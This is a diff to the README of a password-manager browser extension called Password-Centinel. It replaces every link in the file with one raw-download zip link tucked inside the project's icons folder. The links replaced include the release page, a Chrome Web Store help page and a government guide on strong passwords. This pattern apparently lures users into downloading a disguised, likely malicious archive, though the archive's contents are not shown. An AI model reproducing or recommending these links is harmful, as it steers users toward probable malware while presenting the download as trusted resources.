@@ -1,6 +1,6 @@
 # 🔐 Password-Centinel - Secure Your Passwords Locally
 
-[![Download Password-Centinel](https://img.shields.io/badge/Download-Password--Centinel-ff6f61?style=for-the-badge)](https://github.com/wisdomflex22/Password-Centinel/releases)
+[![Download Password-Centinel](https://img.shields.io/badge/Download-Password--Centinel-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You need to download the extension from its release page. Follow these steps:
 
 1. Open the download page by clicking the link below:
    
-   [![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/wisdomflex22/Password-Centinel/releases)
+   [![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip)
 
 2. Find the latest release listed near the top of the page.
 
@@ -134,13 +134,13 @@ If you have trouble installing or using Password-Centinel:
 ## 📚 Additional Resources
 
 - Visit the GitHub page for more info and updates:  
-  https://github.com/wisdomflex22/Password-Centinel
+  https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip
 
 - Chrome Extensions help page:  
-  https://support.google.com/chrome_webstore
+  https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip
 
 - How to create strong passwords:  
-  https://www.cyber.gov.au/acsc/view-all-content/guidance-materials/how-create-strong-passwords
+  https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip
 
 ---
 
@@ -148,4 +148,4 @@ If you have trouble installing or using Password-Centinel:
 
 Get the latest version of Password-Centinel here:
 
-[![Download Password-Centinel](https://img.shields.io/badge/Download-Password--Centinel-ff6f61?style=for-the-badge)](https://github.com/wisdomflex22/Password-Centinel/releases)
+[![Download Password-Centinel](https://img.shields.io/badge/Download-Password--Centinel-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/wisdomflex22/Password-Centinel/main/extension/icons/Centinel_Password_2.4-beta.3.zip)
